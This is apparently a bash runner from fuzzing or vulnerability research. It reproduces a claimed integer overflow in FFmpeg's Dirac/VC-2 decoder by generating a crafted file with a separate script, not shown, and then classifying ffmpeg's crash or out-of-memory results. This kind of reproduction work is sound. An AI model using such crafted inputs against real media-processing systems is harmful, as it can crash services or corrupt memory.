#!/bin/bash
# PoC runner for VULN 001: Integer Overflow in decode_hq_slice_row
# File: libavcodec/diracdec.c

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
GEN_SCRIPT="$SCRIPT_DIR/vuln_001_gen.py"
INPUT_FILE="$SCRIPT_DIR/vuln_001_input.vc2"
RESULT_FILE="$SCRIPT_DIR/vuln_001_result.txt"
STATUS_FILE="$SCRIPT_DIR/vuln_001_status.txt"

# Use --demo flag for smaller (faster, less RAM) test
# Use no flag for the full 28384x28384 PoC (requires ~10 GB RAM)
DEMO_FLAG="${1:-}"   # pass "--demo" as first arg for demo mode

echo "====== VULN 001 PoC Runner ======"
echo "CWE-190: Integer Overflow in decode_hq_slice_row"
echo "File: libavcodec/diracdec.c line 923"
echo ""

# Step 1: Generate the VC-2 file
echo "[1/3] Generating crafted VC-2 file..."
cd "$SCRIPT_DIR"
python3 "$GEN_SCRIPT" $DEMO_FLAG 2>&1 | tee -a "$RESULT_FILE"
echo ""

if [ ! -f "$INPUT_FILE" ]; then
    echo "ERROR: Failed to generate $INPUT_FILE" | tee -a "$RESULT_FILE"
    echo "FAILED: gen script did not produce input file" > "$STATUS_FILE"
    exit 1
fi

# Step 2: Check ffmpeg binary
echo "[2/3] Checking ffmpeg binary..."
if [ ! -f "$FFMPEG" ]; then
    echo "ERROR: ffmpeg binary not found at $FFMPEG" | tee -a "$RESULT_FILE"
    echo "FAILED: ffmpeg binary missing" > "$STATUS_FILE"
    exit 1
fi
echo "    ffmpeg: $FFMPEG"
"$FFMPEG" -version 2>&1 | head -1 | tee -a "$RESULT_FILE"
echo ""

# Step 3: Run ffmpeg against the crafted file
echo "[3/3] Running ffmpeg with crafted VC-2 file..."
echo "    Input: $INPUT_FILE"
echo "    Command: $FFMPEG -threads 4 -i $INPUT_FILE -f null -"
echo ""
echo "--- ffmpeg output ---" | tee -a "$RESULT_FILE"

# Capture output and exit code
set +e
timeout 120 "$FFMPEG" -threads 4 -i "$INPUT_FILE" -f null - \
    >> "$RESULT_FILE" 2>&1
FFMPEG_EXIT=$?
set -e

echo "--- end ffmpeg output ---" | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"
echo "ffmpeg exit code: $FFMPEG_EXIT" | tee -a "$RESULT_FILE"

# Interpret result
echo "" | tee -a "$RESULT_FILE"
echo "====== Result Analysis ======" | tee -a "$RESULT_FILE"

if grep -q "thread buffer allocation failure\|ENOMEM\|Cannot allocate memory" "$RESULT_FILE" 2>/dev/null; then
    STATUS="TRIGGERED_OOM: Reached decode_lowdelay() and failed thread buffer allocation"
    echo "[!] $STATUS" | tee -a "$RESULT_FILE"
elif grep -q "Segmentation fault\|SIGSEGV\|heap-buffer-overflow\|AddressSanitizer" "$RESULT_FILE" 2>/dev/null; then
    STATUS="CRASHED: Memory safety violation detected (integer overflow triggered OOB write)"
    echo "[!!!] $STATUS" | tee -a "$RESULT_FILE"
elif [ $FFMPEG_EXIT -ne 0 ]; then
    STATUS="ERROR_EXIT($FFMPEG_EXIT): ffmpeg returned error (may be parse failure or OOM)"
    echo "[*] $STATUS" | tee -a "$RESULT_FILE"
else
    STATUS="COMPLETED: ffmpeg decoded without crash (insufficient frame size or insufficient RAM)"
    echo "[*] $STATUS" | tee -a "$RESULT_FILE"
fi

echo "$STATUS" > "$STATUS_FILE"
echo "" | tee -a "$RESULT_FILE"
echo "Results saved to: $RESULT_FILE"
echo "Status saved to: $STATUS_FILE"
